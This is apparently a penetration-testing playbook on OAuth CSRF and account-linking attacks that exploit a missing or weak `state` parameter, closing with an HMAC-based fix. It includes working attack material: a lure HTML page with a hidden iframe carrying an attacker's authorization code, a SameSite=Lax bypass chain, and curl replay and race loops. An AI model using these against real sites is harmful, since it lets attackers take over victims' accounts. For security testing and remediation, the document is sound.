# OAuth — CSRF via Missing/Weak `state` Parameter

## When this applies

- The OAuth flow does NOT include a `state` parameter.
- `state` is included but not validated server-side.
- `state` is predictable (e.g. static `"123"`) or not bound to the session.

## Technique

The `state` parameter exists to bind the OAuth flow to the user's browser session. Without it, an attacker can pre-authorize the OAuth provider as themselves, then trick a victim into completing the callback — linking the attacker's external identity to the victim's session ("account linking attack" / "re-linking attack").

Result: attacker can log in as victim via the external provider.

## Steps

### 1. Detect missing `state`

```http
GET /auth?client_id=abc&redirect_uri=https://app.com/callback&response_type=code HTTP/1.1
                                                                              ^^^^^^ no &state=
```

If the provider proceeds without `state`, the flow is vulnerable.

### 2. Detect non-validated `state`

Capture a callback URL and replay with a different `state`:

```bash
curl "https://app.com/callback?code=ABC&state=ANY_RANDOM_VALUE"
```

If the application accepts the callback (logs in / links account), `state` is not validated.

### 3. Detect predictable `state`

```bash
# Capture multiple flows; observe state values
state=123
state=abc123
state=default
state=$session_id   # bound but predictable
```

If `state` is predictable, attacker can pre-compute it.

### 4. Account-linking CSRF exploit (full chain)

```html
<!DOCTYPE html>
<html>
<head><title>Special Offer</title></head>
<body>
<h1>Loading your exclusive offer...</h1>

<!-- Hidden iframe pre-authorized by ATTACKER triggers OAuth linking -->
<iframe
    src="https://victim.com/oauth-linking?code=ATTACKER_AUTHORIZATION_CODE"
    style="display:none;">
</iframe>

<script>
setTimeout(function() {
    window.location = 'https://victim.com/login';
}, 3000);
</script>
</body>
</html>
```

When a victim with an existing victim.com session visits the page, the iframe triggers `victim.com/oauth-linking?code=ATTACKER_CODE` — victim.com binds the attacker's external identity to the victim's account. Attacker then logs in via the external provider and authenticates as victim.

### 5. SameSite=Lax bypass via top-level navigation

Modern browsers default cookies to `SameSite=Lax`, which blocks cross-site sub-requests (iframes, fetch). However, Lax ALLOWS top-level GET navigations. Callback URLs like `/callback?code=...` are GET, so Lax does not stop them.

Combined with stored XSS or open redirect ON the victim origin (same-origin context), the attacker chains:

1. Pre-authorize the OAuth provider as the attacker → obtain authorization code bound to the attacker's identity.
2. Trigger from within the victim origin:
   ```javascript
   window.location = '/accounts/oauth2/<provider>/callback/?code=<ATTACKER_CODE>'
   ```
   This is a same-origin top-level navigation. Cookies (including Lax) are sent. The provider's callback handler links the attacker's external identity to the currently-authenticated victim session.
3. Attacker logs in via the external provider → authenticated as victim.

Useful when victim is admin.

Detection: submit OAuth flow with tampered/omitted `state`; if callback still succeeds and links identity, the app is vulnerable to re-linking CSRF even under SameSite=Lax cookies.

### 6. Race / parallel state validation bypass

Some `state` validations have race conditions:

```bash
# Send multiple parallel requests with the same state
for i in {1..50}; do
  curl "https://app.com/callback?code=$CODE&state=$STATE" &
done
wait
```

If the state is single-use but validation isn't atomic, multiple flows may succeed.

### 7. State not bound to session

Use a state captured from User A's flow as part of an attack against User B:

1. Attacker initiates OAuth flow → gets `state=ABC`.
2. Victim is tricked into following a link with `code=ATTACKER&state=ABC`.
3. If victim's session validates ANY known state (not session-bound), the link succeeds.

### 8. Fix verification

Server should generate session-bound state:

```python
import secrets, hmac, hashlib

def generate_state(session_id):
    random_part = secrets.token_urlsafe(32)
    mac = hmac.new(SECRET_KEY.encode(),
                   f"{session_id}:{random_part}".encode(),
                   hashlib.sha256).hexdigest()
    return f"{random_part}:{mac}"

def validate_state(state, session_id):
    random_part, received_mac = state.split(':', 1)
    expected_mac = hmac.new(SECRET_KEY.encode(),
                            f"{session_id}:{random_part}".encode(),
                            hashlib.sha256).hexdigest()
    return hmac.compare_digest(received_mac, expected_mac)
```

## Verifying success

- Callback URL with arbitrary `state` returns 200 / completes login.
- Account linking succeeds without victim's interaction with the OAuth provider.
- Subsequent login via the attacker's external provider authenticates as the linked victim user.

## Common pitfalls

- OAuth 2.1 mandates `state` (or PKCE) for public clients — modern flows are usually safe.
- Some providers generate state for you; the attack is on how the CLIENT (your target app) validates it.
- Session-bound state with HMAC is the correct fix; merely "random" state without binding is still vulnerable to replay.
- SameSite=Strict cookies block the top-level navigation trick; only Lax is bypassable.
- Test BOTH initial-login and account-linking flows — they often have different state-validation logic.

## Tools

- Burp Suite Repeater (replay callbacks with modified state).
- Race-condition tooling (Turbo Intruder) for parallel state-replay tests.
- Manual HTML PoC pages for the account-linking demo.
